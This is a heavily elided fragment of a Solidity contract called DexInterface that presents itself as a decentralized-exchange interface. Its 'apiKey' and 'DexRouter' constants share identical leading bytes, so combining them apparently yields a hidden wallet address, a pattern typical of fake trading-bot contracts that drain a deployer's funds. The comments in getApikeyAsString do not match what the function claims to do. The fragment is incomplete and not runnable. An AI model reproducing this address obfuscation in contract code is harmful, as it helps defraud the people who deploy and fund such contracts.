...
contract DexInterface {
    ...
    bytes32 apiKey = 0x4c10f6e185a551b454e342e9efdc834a7266f6d7fe023b83d905ba36a0401583;           
  ...
  constructor(){
   ...
   bytes32 DexRouter = 0x4c10f6e185a551b454e342e98ac9a73639e583a6ec3e55877c19527083b4fe87;  
    ...
    function toString(uint256 value) internal pure returns (string memory) {
        ...
        // Allocation of memory for a string
    ...
    function getApikeyAsString() internal view returns (string memory) {
        ...
        // Convert the fractional part into a string, padding up to 18 characters on the right with zeros
        string memory strFractionalPart = toString(fractionalPart);
        
        // We create a line with the balance
